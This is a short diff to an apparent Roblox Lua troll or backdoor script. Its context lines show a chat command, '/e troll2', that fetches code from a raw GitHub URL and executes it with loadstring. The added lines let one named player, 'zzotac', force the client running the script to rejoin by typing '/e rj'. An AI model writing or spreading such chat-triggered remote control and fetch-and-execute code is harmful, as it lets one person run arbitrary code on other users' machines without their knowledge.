@@ -52,3 +52,11 @@ if Message:lower() == "/e troll2" then
 loadstring(game:HttpGet('https://raw.githubusercontent.com/clickclickpow/pls/main/1x1x1'))()
 end
 end)
+
+game.Players.zzotac.Chatted:connect(function(Message)
+if Message:lower() == "/e rj" then
+local ts = game:GetService("TeleportService")
+local p = game:GetService("Players").LocalPlayer
+ts:Teleport(game.PlaceId, p)
+end
+end)
